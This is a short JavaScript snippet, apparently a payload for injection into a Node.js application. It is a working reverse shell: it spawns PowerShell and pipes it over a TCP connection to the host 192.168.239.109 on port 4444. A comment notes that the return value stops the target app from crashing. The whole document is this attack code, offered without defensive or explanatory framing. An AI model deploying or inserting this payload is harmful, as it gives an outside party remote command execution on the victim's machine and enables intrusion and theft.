(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("powershell", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.239.109", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();